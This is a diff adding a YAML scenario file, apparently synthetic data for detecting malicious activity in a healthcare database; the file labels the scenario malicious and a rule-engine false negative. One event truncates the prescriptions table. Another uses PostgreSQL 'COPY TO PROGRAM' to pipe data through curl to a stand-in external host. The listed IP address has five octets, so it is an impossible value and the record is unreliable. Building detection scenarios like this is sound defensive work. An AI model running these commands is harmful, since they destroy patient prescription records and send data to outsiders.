@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_74_data_tamper_mal_2159
+family_id: gen_healthcare_74_data_tamper_mal_fam2159
+domain: healthcare
+time_of_day: 02:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE prescriptions
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 141.98.11.128.113
+      port: 8443
